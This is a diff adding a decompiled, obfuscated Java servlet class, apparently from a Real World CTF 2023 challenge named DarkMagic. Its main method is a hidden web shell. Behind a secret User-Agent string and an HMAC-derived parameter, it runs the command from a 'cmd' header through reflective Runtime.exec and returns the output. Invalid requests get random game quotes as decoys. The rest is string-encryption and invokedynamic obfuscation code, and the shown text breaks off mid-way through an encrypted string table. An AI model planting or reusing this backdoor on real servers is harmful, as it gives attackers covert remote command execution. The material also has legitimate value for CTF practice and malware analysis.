@@ -1,0 +1,572 @@
+public class com.rw.rwctf2023.DarkMagic {
+    public void DarkMagic() {
+        invokespecial:Object(Object::<init>, this:DarkMagic)
+    }
+    
+    public static void invoke(javax.servlet.http.HttpServletRequest p0, javax.servlet.http.HttpServletResponse p1) {
+        stack_14B_1 : String [generated]
+        var_2_150 : String
+        var_3_230 : String
+        stack_28A_0 : String [generated]
+        var_4_28A : String
+        stack_4D8_0 : String [generated]
+        stack_5FA_0 : PrintWriter [generated]
+        stack_5F5_0 : String[] [generated]
+        stack_6DD_0 : String [generated]
+        stack_77A_1 : byte[] [generated]
+        stack_77A_2 : String [generated]
+        var_5_77D : SecretKeySpec
+        stack_7D4_0 : String [generated]
+        var_6_7D9 : Mac
+        var_7_88E : byte[]
+        stack_92A_0 : byte[] [generated]
+        var_7_92A : byte[]
+        stack_9B8_0 : String [generated]
+        stack_A01_0 : boolean [generated]
+        stack_BA3_0 : PrintWriter [generated]
+        stack_B5B_0 : String[] [generated]
+        stack_BA3_1 : String [generated]
+        stack_D2C_0 : Method [generated]
+        var_8_D2C : Method
+        stack_EB7_0 : Class [generated]
+        stack_EB7_1 : String [generated]
+        expr_DD8 : Class[] [generated]
+        stack_EB6_1 : int [generated]
+        stack_EB6_2 : Class [generated]
+        var_9_EBC : Method
+        stack_F5B_0 : Method [generated]
+        stack_F12_0 : String [generated]
+        stack_F5B_1 : Class [generated]
+        var_10_F60 : Object
+        stack_1105_0 : Method [generated]
+        stack_1105_1 : Object [generated]
+        expr_FEE : Object[] [generated]
+        stack_10C1_1 : int [generated]
+        stack_10C1_2 : String [generated]
+        var_11_110A : Object
+        stack_1203_0 : Class [generated]
+        stack_1203_1 : String [generated]
+        stack_1203_2 : Class[] [generated]
+        var_12_120B : Method
+        stack_135A_0 : Method [generated]
+        stack_135A_1 : Object [generated]
+        stack_1317_0 : int [generated]
+        stack_135A_2 : Object[] [generated]
+        var_13_1362 : InputStream
+        var_14_13FF : BufferedReader
+        stack_148F_0 : BufferedReader [generated]
+        var_15_1496 : String
+        stack_14E9_0 : PrintWriter [generated]
+        stack_14E9_1 : String [generated]
+        
+        stack_14B_1 = "cmd"
+        var_2_150 = javax.servlet.http.HttpServletRequest::getHeader(p0:HttpServletRequest, stack_14B_1:String)
+        var_3_230 = javax.servlet.http.HttpServletRequest::getHeader(p0:HttpServletRequest, "User-Agent")
+        stack_28A_0 = javax.servlet.http.HttpServletRequest::getParameter(p0:HttpServletRequest, "curses")
+        var_4_28A = stack_28A_0:String
+        if (logicalnot:boolean(java.util.Objects::equals(var_3_230:String, "The Argent Dawn"))) {
+            java.io.PrintWriter::println(javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse), com.rw.rwctf2023.DarkMagic::randomChoice(getstatic:String[](DarkMagic::words)))
+            
+            return:void()
+        }
+        stack_4D8_0 = var_2_150:String
+        if (stack_4D8_0:String == aconstnull:String()) {
+            stack_5FA_0 = javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse)
+            
+            stack_5F5_0 = getstatic:String[](DarkMagic::words)
+            
+            java.io.PrintWriter::println(stack_5FA_0:PrintWriter, com.rw.rwctf2023.DarkMagic::randomChoice(stack_5F5_0:String[]))
+            return:void()
+        }
+        stack_6DD_0 = "Victory or death!"
+        stack_77A_1 = checkcast:byte[](byte[].class, java.lang.String::getBytes(stack_6DD_0:String))
+        stack_77A_2 = "HmacSHA256"
+        var_5_77D = initobject:SecretKeySpec(SecretKeySpec::<init>, stack_77A_1:byte[], stack_77A_2:String)
+        stack_7D4_0 = "HmacSHA256"
+        var_6_7D9 = javax.crypto.Mac::getInstance(stack_7D4_0:String)
+        javax.crypto.Mac::init(var_6_7D9:Mac, var_5_77D:SecretKeySpec)
+        var_7_88E = checkcast:byte[](byte[].class, javax.crypto.Mac::doFinal(var_6_7D9:Mac, checkcast:byte[](byte[].class, java.lang.String::getBytes("Lok-tar ogar"))))
+        stack_92A_0 = checkcast:byte[](byte[].class, java.util.Base64$Encoder::encode(java.util.Base64::getEncoder(var_7_88E:byte[]))
+        var_7_92A = stack_92A_0:byte[]
+        stack_9B8_0 = var_4_28A:String
+        stack_A01_0 = java.lang.String::equals(stack_9B8_0:String, initobject:String(String::<init>, var_7_92A:byte[]))
+        if (logicalnot:boolean(stack_A01_0:boolean)) {
+            stack_BA3_0 = javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse)
+            stack_B5B_0 = getstatic:String[](DarkMagic::words)
+            stack_BA3_1 = com.rw.rwctf2023.DarkMagic::randomChoice(stack_B5B_0:String[])
+            java.io.PrintWriter::println(stack_BA3_0:PrintWriter, stack_BA3_1:String)
+            return:void()
+        }
+        stack_D2C_0 = java.lang.Class::getMethod(java.lang.Class::forName("java.lang.Runtime"), "getRuntime", newarray:Class[](java.lang.Class.class, 0))
+        var_8_D2C = stack_D2C_0:Method
+        stack_EB7_0 = java.lang.Class::forName("java.lang.Runtime")
+        stack_EB7_1 = "exec"
+        expr_DD8 = initarray:Class[](java.lang.Class[].class, defaultvalue:Class(java.lang.Class.class))
+        stack_EB6_1 = 0
+        stack_EB6_2 = java.lang.Class::forName("java.lang.String")
+        expr_DD8[stack_EB6_1:int] = stack_EB6_2:Class;
+        var_9_EBC = java.lang.Class::getMethod(stack_EB7_0:Class, stack_EB7_1:String, expr_DD8:Class[])
+        stack_F5B_0 = var_8_D2C:Method
+        stack_F12_0 = "java.lang.Runtime"
+        stack_F5B_1 = java.lang.Class::forName(stack_F12_0:String)
+        var_10_F60 = java.lang.reflect.Method::invoke(stack_F5B_0:Method, stack_F5B_1:Class, newarray:Object[](java.lang.Object.class, 0))
+        stack_1105_0 = var_9_EBC:Method
+        stack_1105_1 = var_10_F60:Object
+        expr_FEE = initarray:Object[](java.lang.Object[].class, defaultvalue:Object(java.lang.Object.class))
+        stack_10C1_1 = 0
+        stack_10C1_2 = var_2_150:String
+        expr_FEE[stack_10C1_1:int] = stack_10C1_2:String[expected:Object];
+        var_11_110A = java.lang.reflect.Method::invoke(stack_1105_0:Method, stack_1105_1:Object, expr_FEE:Object[])
+        stack_1203_0 = java.lang.Class::forName("java.lang.Process")
+        stack_1203_1 = "getInputStream"
+        stack_1203_2 = newarray:Class[](java.lang.Class.class, 0)
+        var_12_120B = java.lang.Class::getMethod(stack_1203_0:Class, stack_1203_1:String, stack_1203_2:Class[])
+        stack_135A_0 = var_12_120B:Method
+        stack_135A_1 = var_11_110A:Object
+        stack_1317_0 = 0
+        stack_135A_2 = newarray:Object[](java.lang.Object.class, stack_1317_0:int)
+        var_13_1362 = checkcast:InputStream(java.io.InputStream.class, java.lang.reflect.Method::invoke(stack_135A_0:Method, stack_135A_1:Object, stack_135A_2:Object[]))
+        var_14_13FF = initobject:BufferedReader(BufferedReader::<init>, initobject:InputStreamReader[expected:Reader](InputStreamReader::<init>, var_13_1362:InputStream))
+        
+        loop {
+            stack_148F_0 = var_14_13FF:BufferedReader
+            
+            if (var_15_1496 = java.io.BufferedReader::readLine(stack_148F_0:BufferedReader) == aconstnull:String()) {
+                return:void()
+            }
+            
+            stack_14E9_0 = javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse)
+            stack_14E9_1 = var_15_1496:String
+            
+            java.io.PrintWriter::println(stack_14E9_0:PrintWriter, stack_14E9_1:String)
+            
+            if (getstatic:int(DarkMagic::v0001_d08dc2ad5360ca1b40c6901a8) < 0) {
+                athrow(aconstnull:__Null())
+            }
+            
+            loopcontinue()
+        }
+    }
+    
+    private static java.lang.String randomChoice(java.lang.String[] p0) {
+        expr_B7 : Random [generated]
+        stack_1CB_1 : int [generated]
+        stack_213_1 : int [generated]
+
+        expr_B7 = initobject:Random(Random::<init>)
+        stack_1CB_1 = p0 .length
+        stack_213_1 = java.util.Random::nextInt(expr_B7:Random, stack_1CB_1:int)
+        return:String(p0[stack_213_1:int])
+    }
+    
+    static {
+        stack_D7_0 : int [generated]
+        expr_D7 : String[] [generated]
+        stack_207_1 : int [generated]
+        stack_2A0_1 : int [generated]
+        stack_2A0_2 : String [generated]
+        stack_3F0_1 : int [generated]
+        stack_3F0_2 : String [generated]
+        stack_448_1 : int [generated]
+        stack_448_2 : String [generated]
+        stack_53C_1 : int [generated]
+        stack_53C_2 : String [generated]
+        
+        static String[] DarkMagic::v0004_e0baaa98494ddd8fd1cb6637 = newarray:String[](java.lang.String.class, 118);
+        static String[] DarkMagic::v0005_27759afbd4d1d8bb8a5777d = newarray:String[](java.lang.String.class, 118);
+        invokestatic:void(DarkMagic::v0156_ddf31117bc14aeded65c06)
+        static int DarkMagic::v0002_7dc63c31afef80fb436a19 = -762998497;
+        static int DarkMagic::v0003_c0b6b371ae9ae0d408135c2 = 184;
+        stack_D7_0 = 10
+        expr_D7 = newarray:String[](java.lang.String.class, stack_D7_0:int)
+        expr_D7[0] = "The hunter is nothing without the hunt.";
+        stack_207_1 = 1
+        expr_D7[stack_207_1:int] = "You Are Not Prepared!";
+        stack_2A0_1 = 2
+        stack_2A0_2 = "You Are Not Prepared!"
+        expr_D7[stack_2A0_1] = stack_2A0_2;
+        expr_D7[3] = "You Are Not Prepared!";
+        expr_D7[4] = "My destiny is my own.";
+        expr_D7[5] = "You learned that the things that once tormented you could give you power.";
+        stack_3F0_1 = 6
+        stack_3F0_2 = "Sometimes the hand of fate must be forced."
+        expr_D7[stack_3F0_1] = stack_3F0_2;
+        stack_448_1 = 7
+        stack_448_2 = "In times I wished your heart had made a different choice. In the end, I know it made the right one."
+        expr_D7[stack_448_1] = stack_448_2;
+        expr_D7[8] = "You wish to know the difference between the demons and us? They will stop at nothing to destroy our world. And we will sacrifice everything to save it.";
+        stack_53C_1 = 9
+        stack_53C_2 = "Betrayer... in truth, it was I who was betrayed. Still, I am hunted. Still, I am hated. Now, my blind eyes see what others cannot. And sometimes the hand of fate must be forced."
+        expr_D7[stack_53C_1] = stack_53C_2;
+        static String[] DarkMagic::words = expr_D7:String[];
+    }
+    
+    public static java.lang.Object v0014_0cc215bba1599024528ec63(java.lang.Object p0, java.lang.String p1, java.lang.Object p2, java.lang.Object p3, java.lang.Object p4, java.lang.Object p5, java.lang.Object p6, java.lang.String p7, java.lang.Object p8, java.lang.Object p9, java.lang.Object p10, java.lang.Object p11, java.lang.Object p12) {
+        var_11_88 : int
+        var_12_8F : char[]
+        var_13_94 : int
+        var_14_9E : char[]
+        var_15_A5 : byte[]
+        var_16_A8 : int
+        var_16_DD : Class<?>
+        var_14_E7 : char[]
+        var_15_EE : byte[]
+        var_17_F1 : int
+        var_17_127 : MethodType
+        var_14_131 : char[]
+        var_15_138 : byte[]
+        var_18_13B : int
+        
+        var_11_88 = ((invokevirtual:int(Integer::intValue, checkcast:Integer(java.lang.Integer.class, p3:Object[expected:Integer])) ^ getstatic:int(DarkMagic::v0002_7dc63c31afef80fb436a19)) & 255)
+        var_12_8F = invokevirtual:char[](String::toCharArray, p7:String)
+        var_13_94 = getstatic:int(DarkMagic::v0003_c0b6b371ae9ae0d408135c2)
+        var_14_9E = invokevirtual:char[](String::toCharArray, checkcast:String(java.lang.String.class, p4:Object[expected:String]))
+        var_15_A5 = newarray:byte[](byte.class, var_14_9E .length)
+        var_16_A8 = 0
+        
+        while (var_16_A8:int < var_14_9E .length) {
+            var_15_A5[var_16_A8:int] = i2b:byte((var_14_9E[var_16_A8:int] ^ var_12_8F[(var_16_A8:int % var_12_8F .length)]) & 255);
+            var_16_A8 += 1;
+        }
+        
+        var_16_DD = invokestatic:Class<?>(Class<T>::forName, initobject:String(String::<init>, var_15_A5:byte[]))
+        var_14_E7 = invokevirtual:char[](String::toCharArray, checkcast:String(java.lang.String.class, p6:Object[expected:String]))
+        var_15_EE = newarray:byte[](byte.class, var_14_E7 .length)
+        var_17_F1 = 0
+        
+        while (var_17_F1:int < var_14_E7 .length) {
+            var_15_EE[var_17_F1:int] = i2b:byte(var_14_E7[var_17_F1:int] ^ var_12_8F[(var_17_F1:int % var_12_8F .length)]);
+            var_17_F1 += 1;
+        }
+        
+        var_17_127 = invokestatic:MethodType(MethodType::fromMethodDescriptorString, initobject:String(String::<init>, var_15_EE:byte[]), invokevirtual:ClassLoader(Class::getClassLoader, var_16_DD:Class))
+        var_14_131 = invokevirtual:char[](String::toCharArray, checkcast:String(java.lang.String.class, p5:Object[expected:String]))
+        var_15_138 = newarray:byte[](byte.class, var_14_131 .length)
+        var_18_13B = 0
+        
+        while (var_18_13B:int < var_14_131 .length) {
+            var_15_138[var_18_13B:int] = i2b:byte(var_14_131[var_18_13B:int] ^ var_12_8F[(var_18_13B:int % var_12_8F .length)]);
+            var_18_13B += 1;
+        }
+        
+        if (var_11_88:int == var_13_94:int) {
+            return:Object(initobject:MutableCallSite(MutableCallSite::<init>, invokevirtual:MethodHandle(MethodHandle::asType, invokevirtual:MethodHandle(Lookup::findStatic, checkcast:Lookup(java.lang.invoke.MethodHandles.Lookup.class, p0:Object[expected:Lookup]), var_16_DD:Class, initobject:String(String::<init>, var_15_138:byte[]), var_17_127:MethodType), checkcast:MethodType(java.lang.invoke.MethodType.class, p2:Object[expected:MethodType]))))
+        }
+        
+        return:Object(initobject:MutableCallSite(MutableCallSite::<init>, invokevirtual:MethodHandle(MethodHandle::asType, invokevirtual:MethodHandle(Lookup::findVirtual, checkcast:Lookup(java.lang.invoke.MethodHandles.Lookup.class, p0:Object[expected:Lookup]), var_16_DD:Class, initobject:String(String::<init>, var_15_138:byte[]), var_17_127:MethodType), checkcast:MethodType(java.lang.invoke.MethodType.class, p2:Object[expected:MethodType]))))
+    }
+    
+    private static java.lang.Object v0007_1c4783e5646d75c310ec(java.lang.invoke.MethodHandles.Lookup p0, java.lang.String p1, java.lang.invoke.MethodType p2) {
+        return:Object(initobject:MutableCallSite[expected:Object](MutableCallSite::<init>, invokevirtual:MethodHandle(MethodHandle::asType, invokevirtual:MethodHandle(Lookup::findStatic, p0:Lookup, ldc:Class<DarkMagic>(com.rw.rwctf2023.DarkMagic.class), "v0182_b11b5b2ea78b5c191b53126d", invokestatic:MethodType(MethodType::fromMethodDescriptorString, "(IJ)Ljava/lang/String;", invokevirtual:ClassLoader(Class<T>::getClassLoader, ldc:Class<DarkMagic>(com.rw.rwctf2023.DarkMagic.class)))), p2:MethodType)))
+    }
+    
+    private static java.lang.String v0182_b11b5b2ea78b5c191b53126d(int p0, long p1) {
+        var_3_8F : Cipher
+        var_4_96 : SecretKeyFactory
+        var_5_9C : byte[]
+        var_6_A9 : int
+        
+        if (loadelement:String(getstatic:String[](DarkMagic::v0004_e0baaa98494ddd8fd1cb6637), p0:int) == aconstnull:String()) {
+            p1 = (p1:long ^ 96L)
+            p1 = (p1:long ^ 4557847193904795529L)
+            var_3_8F = invokestatic:Cipher(Cipher::getInstance, "DES/CBC/PKCS5Padding")
+            var_4_96 = invokestatic:SecretKeyFactory(SecretKeyFactory::getInstance, "DES")
+            var_5_9C = newarray:byte[](byte.class, 8)
+            var_5_9C[0] = i2b:byte(l2i:int(p1:long >>u 56));
+            var_6_A9 = 1
+            
+            while (var_6_A9:int < 8) {
+                var_5_9C[var_6_A9:int] = i2b:byte(l2i:int((shl:long(p1:long, (var_6_A9:int * 8)) >>u 56) << p0:int));
+                var_6_A9 += 1;
+            }
+            
+            invokevirtual:void(Cipher::init, var_3_8F:Cipher, 2, invokevirtual:SecretKey(SecretKeyFactory::generateSecret, var_4_96:SecretKeyFactory, initobject:DESKeySpec(DESKeySpec::<init>, var_5_9C:byte[])), initobject:IvParameterSpec[expected:AlgorithmParameterSpec](IvParameterSpec::<init>, newarray:byte[](byte.class, 8)))
+            DarkMagic::v0004_e0baaa98494ddd8fd1cb6637[p0:int] = initobject:String(String::<init>, invokevirtual:byte[](Cipher::doFinal, var_3_8F:Cipher, invokevirtual:byte[](Decoder::decode, invokestatic:Decoder(Base64::getDecoder), loadelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), p0:int))));
+        }
+        
+        return:String(loadelement:String(getstatic:String[](DarkMagic::v0004_e0baaa98494ddd8fd1cb6637), p0:int))
+    }
+    
+    private static void v0156_ddf31117bc14aeded65c06() {
+        var_0_82 : long
+        var_2_89 : Cipher
+        var_3_90 : SecretKeyFactory
+        var_4_95 : byte[]
+        var_5_A2 : int
+        var_5_E0 : int
+        var_6_E3 : int
+        
+        static long DarkMagic::v0006_51cb98f94cbf115ea9ea = -1787229411635844770L;
+        var_0_82 = (getstatic:long(DarkMagic::v0006_51cb98f94cbf115ea9ea) ^ 4557847193904795529L)
+        var_2_89 = invokestatic:Cipher(Cipher::getInstance, "DES/CBC/PKCS5Padding")
+        var_3_90 = invokestatic:SecretKeyFactory(SecretKeyFactory::getInstance, "DES")
+        var_4_95 = newarray:byte[](byte.class, 8)
+        var_4_95[0] = i2b:byte(l2i:int(var_0_82:long >>u 56));
+        var_5_A2 = 1
+        
+        while (var_5_A2:int < 8) {
+            var_4_95[var_5_A2:int] = i2b:byte(l2i:int((var_0_82:long << (var_5_A2:int * 8)) >>u 56));
+            var_5_A2 += 1;
+        }
+        
+        invokevirtual:void(Cipher::init, var_2_89:Cipher, 2, invokevirtual:SecretKey(SecretKeyFactory::generateSecret, var_3_90:SecretKeyFactory, initobject:DESKeySpec(DESKeySpec::<init>, var_4_95:byte[])), initobject:IvParameterSpec[expected:AlgorithmParameterSpec](IvParameterSpec::<init>, newarray:byte[](byte.class, 8)))
+        var_5_E0 = 1
+        var_6_E3 = 0
+        
+        while (var_6_E3:int < var_5_E0:int) {
+            switch (var_6_E3:int) {
+                case 0:
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[0] = "0Ez0xGp13BQ6RMtXF5tAvqKzYLqqGvPf";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[1] = "op+YbNuekTK0S45W1onhqtDnLIXumrbyYVCTQtmLZSwjUiXYJobLKhUNP4IELjVg";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[2] = "smNQZrUyrGImLGZMFrpCgSXkYfrLrRggmIlBi8KORnBtmL3FYw7kzQQ4nco9poNhFkAA6iXHnnKpsK2wpb3VpCw+HM8mJa24O6hl2m3YXYrz7Bk4DEgvjcrf60MR7M23okgGVu+cfR0=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[3] = "90G07n34WWT19KwEsDRxaJlDtRzf1iTTnW4F53w2GwbLmQG9yhSVXZFkwRueWWaCcWQL/+4eIECxk1HQP5FytyRTSxB0vGutVxuxzGebOT28GQc66WLZFfJyrEJSILLB6KGrDNhdkjagDBd4mR88VfqMeFZ2C/8+TxyJ2t97zZxSH4UK48DlzSNusi4CXv0Q5DH87jd8kH4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[4] = "/R+Em4Piwcc=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[5] = "anlKcumGi1H3PlOxaSsEeX8UE16KFzEE";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[6] = "X71CqQ6zYzHOnWyYRWpRwfpykaFq/kf/";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[7] = "VlHl8rMmKaVsF6dqyOFsaZ49a8Gf/eHu";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[8] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[9] = "Oo3EyAPLBuui9W6G+sGMcg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[10] = "Fee/mGwser8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[11] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[12] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[13] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[14] = "JA+fI7CGo/nruLNnVHiLwA==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[15] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[16] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[17] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[18] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[19] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[20] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[21] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[22] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[23] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[24] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[25] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[26] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[27] = "I1CW8WOS5/+xoqhgAPKFDU4j4wdNhcG0";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[28] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[29] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[30] = "IJcG6Od4P8m7Q3/LSdRNhg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[31] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[32] = "IJcG6Od4P8m7Q3/LSdRNhg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[33] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[34] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[35] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[36] = "E4k0TOh0fe8oI8WIYgaA+A==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[37] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[38] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[39] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[40] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[41] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[42] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[43] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[44] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[45] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[46] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[47] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[48] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[49] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[50] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[51] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[52] = "P7pds31eJyAm9sl1JkN032K+Z5w0e3Pe";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[53] = "TfgetdCAef4lRDgF76hMPA==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[54] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[55] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[56] = "P7pds31eJyAm9sl1JkN032K+Z5w0e3Pe";
